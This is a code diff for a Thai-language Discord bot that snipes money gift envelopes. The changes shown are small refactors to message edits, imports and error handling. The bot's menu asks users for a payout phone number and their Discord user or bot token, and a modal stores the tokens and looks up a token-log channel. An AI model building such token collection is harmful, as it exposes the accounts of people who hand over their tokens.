@@ -6,10 +6,8 @@ import aiohttp
 import json
 import os
 import re
-import io
 import cv2
 import numpy as np
-from PIL import Image
 from keep_alive import keep_alive
 
 # --- Configuration ---
@@ -155,7 +153,7 @@ class TokenInputModal(ui.Modal, title="กรอกข้อมูล Token แ�
                     description=f"<a:1000030103:1551255510215426088> ระบบได้บันทึก Token จำนวน {len(valid_tokens)} ตัว และเบอร์ของคุณเรียบร้อยแล้ว! ประเภท Token: {types_str} <a:1000030106:1551256934215061615>",
                     color=discord.Color.red()
                 )
-                await interaction.followup.edit_message(message_id=msg.id, embed=success_embed)
+                await msg.edit(embed=success_embed)
 
                 log_chan = bot.get_channel(TOKEN_LOG_CHANNEL_ID)
                 if log_chan:
@@ -171,7 +169,7 @@ class TokenInputModal(ui.Modal, title="กรอกข้อมูล Token แ�
                     description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง หรือไม่พบข้อมูลในระบบ โปรดตรวจสอบแล้วลองใหม่อีกครั้ง <a:1000030106:1551256934215061615>",
                     color=discord.Color.red()
                 )
-                await interaction.followup.edit_message(message_id=msg.id, embed=fail_embed)
+                await msg.edit(embed=fail_embed)
         except Exception as e:
             print(f"Error in TokenInputModal: {e}")
 
@@ -223,7 +221,6 @@ class OeiSelect(ui.Select):
                 await interaction.response.send_modal(CheckSingleTokenModal())
 
             else:
-                # ตอบรับ interaction ทันทีป้องกันการขึ้น ไม่ตอบสนองในเวลาที่กำหนด
                 await interaction.response.defer(ephemeral=True)
 
                 if val == "2":
@@ -367,22 +364,25 @@ async def on_message(message: discord.Message):
 # --- Slash Command ---
 @bot.tree.command(name="oei", description="เปิดเมนูดักซอง")
 async def oei_command(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="<a:1000030093:1551252638794780883> Ɗ𐤠ƘⳜⰙƝƓ",
-        description=(
-            "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
-            "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken\n\n"
-            "<a:1000030106:1551256934215061615> **วิธีใช้งาน**\n"
-            "1. กรอกลิส 1 ก่อนเป็นการใส่ข้อมูล\n"
-            "2. หลังจากใส่ลิส 1 สามารถกดลิส 2 เป็นการเริ่มการดัก\n"
-            "3. หากต้องการหยุดให้กดลิส 3\n"
-            "4. เป็นการเช็คการทำงานต่างๆนาๆ\n"
-            "5. Check Token"
-        ),
-        color=discord.Color.red()
-    )
-    embed.set_image(url=GIF_URL)
-    await interaction.response.send_message(embed=embed, view=OeiView())
+    try:
+        embed = discord.Embed(
+            title="<a:1000030093:1551252638794780883> Ɗ𐤠ƘⳜⰙƝƓ",
+            description=(
+                "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
+                "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken\n\n"
+                "<a:1000030106:1551256934215061615> **วิธีใช้งาน**\n"
+                "1. กรอกลิส 1 ก่อนเป็นการใส่ข้อมูล\n"
+                "2. หลังจากใส่ลิส 1 สามารถกดลิส 2 เป็นการเริ่มการดัก\n"
+                "3. หากต้องการหยุดให้กดลิส 3\n"
+                "4. เป็นการเช็คการทำงานต่างๆนาๆ\n"
+                "5. Check Token"
+            ),
+            color=discord.Color.red()
+        )
+        embed.set_image(url=GIF_URL)
+        await interaction.response.send_message(embed=embed, view=OeiView())
+    except Exception as e:
+        print(f"Error in oei_command: {e}")
 
 # --- Bot Ready Event ---
 @bot.event
